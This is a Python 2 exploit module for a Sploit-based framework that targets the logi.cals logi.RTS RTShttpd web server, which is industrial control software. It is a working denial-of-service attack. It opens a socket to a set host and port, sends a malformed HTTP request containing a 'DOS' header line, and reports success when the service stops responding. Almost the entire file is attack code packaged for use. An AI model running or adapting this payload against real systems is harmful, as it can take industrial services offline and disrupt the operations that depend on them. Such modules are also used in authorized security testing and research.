#!/usr/bin/env python
import socket
from collections import OrderedDict


from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_logi_cals_logi_RTS_RTShttpd_DoS"
INFO['DESCRIPTION'] = "logi.cals logi.RTS RTShttpd DoS"
INFO['VENDOR'] = "https://www.logicals.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    Vulnerability exists in webserver. Special TCP packet cause DoS.
Tested against logi.RTS RTShttpd.exe on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "https://www.logicals.com/en/support/downloads"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "30 Mar, 2018"
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 80


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def run(self):
        #Get options from gui
        self.args()
        s = socket.socket()
        s.settimeout(5)
        self.log('[*] Trying to connect to %s:%s' % (self.host, self.port))
        s.connect((self.host, self.port))
        dos = 'GET /1 HTTP/1.1\r\nDOS\r\n\r\n'
        s.send(dos)
        try:
            s.recv(1024)
        except socket.timeout:
            self.log('[+] RTShttpd service is unavailable')
            self.finish(True)
        self.finish(False)



if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()